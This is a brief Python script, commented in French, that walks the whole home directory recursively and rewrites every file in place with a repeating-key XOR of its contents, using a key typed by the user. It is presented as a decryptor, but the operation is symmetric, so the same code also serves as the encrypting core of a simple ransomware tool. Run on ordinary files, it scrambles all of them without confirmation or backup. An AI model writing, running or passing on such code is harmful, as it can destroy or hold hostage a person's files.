import os

# déchiffrer avec XOR
def xor_cypher(input_bytes, key):
    key_bytes = key.encode()
    return bytes(input_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(input_bytes)))

# déchiffrer répertoire
def decrypt_directory(directory, key):
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            try:
                with open(item_path, "rb") as f:
                    content = f.read()
                with open(item_path, "wb") as f:
                    f.write(xor_cypher(content, key))
            except Exception as e:
                print("Erreur lors du traitement du fichier : " + item_path + ":" + str(e))
                continue
        elif os.path.isdir(item_path):
            decrypt_directory(item_path, key)

if __name__ == "__main__":
    key = input("Entrez la clé de déchiffrement : ")

    # Déchiffrement 
    home = os.path.expanduser("~")
    decrypt_directory(home, key)

    print("Déchiffrement terminé.")
